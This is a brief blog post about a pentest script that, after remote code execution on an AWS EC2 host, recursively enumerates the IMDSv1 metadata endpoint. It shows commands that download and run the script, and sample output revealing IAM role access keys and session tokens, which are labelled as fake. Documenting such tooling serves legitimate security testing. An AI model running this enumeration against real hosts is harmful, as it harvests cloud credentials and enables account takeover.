---
layout: post
title: AWS IMDSv1 enumeration script
---

Small script used in the context of pentest once RCE on a server hosted in AWS EC2 was achived.
Recusifly walks the IMDS (metadata) endpoint and print to stdout.
See: https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/ec2-instance-metadata.html
Repo: https://github.com/zrthstr/random_helper_scripts/

*on a AWS host with IMDSv1 enabled*
```
# fetch
wget https://raw.githubusercontent.com/zrthstr/random_helper_scripts/main/AWS_IMDSv1_enum.py

# run
python3 AWS_IMDSv1_enum.py

[+] Trying meta-data
http://169.254.169.254/latest/meta-data/ami-id:
 => ami-01b29208fakeida10
http://169.254.169.254/latest/meta-data/ami-launch-index:
 => 0
http://169.254.169.254/latest/meta-data/ami-manifest-path:
 => (unknown)
http://169.254.169.254/latest/meta-data/block-device-mapping/ami:
 => /dev/xvda
http://169.254.169.254/latest/meta-data/block-device-mapping/root:
 => /dev/xvda
http://169.254.169.254/latest/meta-data/events/maintenance/history:
 => []
http://169.254.169.254/latest/meta-data/events/maintenance/scheduled:
 => []
http://169.254.169.254/latest/meta-data/hostname:
 => ip-172-26-2-10.us-west-2.compute.internal
http://169.254.169.254/latest/meta-data/iam/info:
 => {
  "Code" : "Success",
  "LastUpdated" : "2023-10-17T17:18:11Z",
  "InstanceProfileArn" : "arn:aws:iam::2982fake20309:instance-profile/AmazonLightsailInstanceProfile",
  "InstanceProfileId" : "AIPHSJISJLL3fakeLFDD"
}
http://169.254.169.254/latest/meta-data/iam/security-credentials/AmazonLightsailInstanceRole:
 => {
  "Code" : "Success",
  "LastUpdated" : "2023-10-17T17:19:14Z",
  "Type" : "AWS-HMAC",
  "AccessKeyId" : "ASIAKSK2A0fakeGH3A",
  "SecretAccessKey" : "R4MlZ9SfJ2xN1yHdV6oQthiskeyisfakeA",
  "Token" : "K0p3RzZ1QlhTWnRlthisisafakekeyY4eDQ3SGFMbFdzZmV3eUN0VzhZalYyVUl5NnROdS8zSVk2OUx3eFhuY0pCSmNUZzhhbGZhN09NUwK0p3RzZ1QlhTWnRlb1Y4eDQ3SGFMbFdzZmV3eUN0VzhZalYyVUl5NnROdS8zSVk2OUx3eFhuY0pCSmNUZzhhbGZhN09NUw[...]=",
  "Expiration" : "2023-10-17T23:11:49Z"
}
http://169.254.169.254/latest/meta-data/identity-credentials/ec2/info:
 => {
  "Code" : "Success",
  "LastUpdated" : "2023-10-17T17:08:25Z",
[...]
```

